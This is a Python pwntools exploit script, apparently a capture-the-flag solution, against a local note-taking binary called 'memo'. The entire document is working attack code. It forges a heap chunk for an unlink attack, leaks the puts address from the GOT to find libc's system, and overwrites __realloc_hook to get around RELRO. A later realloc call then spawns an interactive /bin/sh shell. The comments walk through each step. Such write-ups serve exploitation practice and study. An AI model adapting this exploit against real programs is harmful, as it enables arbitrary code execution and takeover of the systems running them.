from pwn import *
p=process('./memo')
libc=ELF('./libc.so')
p.recvuntil('it')
p.sendline('2')
p.recvuntil(':')
p.sendline(p64(0)+p64(1)*5+p64(0)+p64(0x40))
p.recvuntil('it')
p.sendline('4')
p.recvuntil(':')
ptr=0x0602040
p.sendline('a'*8+p64(0x20)+p64(ptr-0x18)+p64(ptr-0x10)+p64(0x20)+'\x40')
#now trigger the realloc
p.recvuntil('it')
p.sendline('3')
p.recvuntil(':')
p.sendline('1024')
p.recvuntil(':')
p.sendline('something')
p.recvuntil('it')
p.sendline('3')
p.recvuntil(':')
p.sendline('128')
p.recvuntil(':')
p.sendline('something')
#now name ptr porints to 0x602028,overwrite the title ptr to BSS
p.recvuntil('it')
p.sendline('4')
p.recvuntil(':')
p.sendline(p64(0)+p64(0x602030))
#now overwrite the concept ptr to leak address
p.recvuntil('6.exit')
p.sendline('5')
p.recvuntil(':')
puts_got=0x601FB8
p.sendline(p64(0x602030)+p64(puts_got))
#leak the puts addr
p.recvuntil('6.exit')
p.sendline('1')
p.recvuntil('On this page you write:\x0a')
puts_addr=p.recvuntil('\x7f')
while(len(puts_addr)<8):
	puts_addr=puts_addr+'\x00'
puts_addr=u64(puts_addr)
print '[*] puts:'+hex(puts_addr)
system_addr=puts_addr-(libc.symbols['puts']-libc.symbols['system'])
print '[*] system:'+hex(system_addr)
realloc_hook=puts_addr-(libc.symbols['puts']-libc.symbols['__realloc_hook'])
print '[*] realloc_hook:'+hex(realloc_hook)
#now overwrite concept ptr to somewhere writeable,I prefer the data segment
#because the elf gets RELRO enabled,the got table isn't writeable
#so we overwrite the realloc_hook value in libc.so,thus we will get shell after calling realloc
p.recvuntil('6.exit')
p.sendline('5')
p.recvuntil(':')
p.sendline(p64(realloc_hook)+p64(0x602000))
p.recvuntil('6.exit')
p.sendline('2')
p.recvuntil(':')
p.sendline('/bin/sh\x00')
#now overwrite the realloc_hook
p.recvuntil('6.exit')
p.sendline('5')
p.recvuntil(':')
p.sendline(p64(system_addr))
#now trigger the realloc to spawn a shell!!!
p.recvuntil('6.exit')
p.sendline('3')
p.recvuntil(':')
p.sendline('1024')
p.recv()
p.interactive()

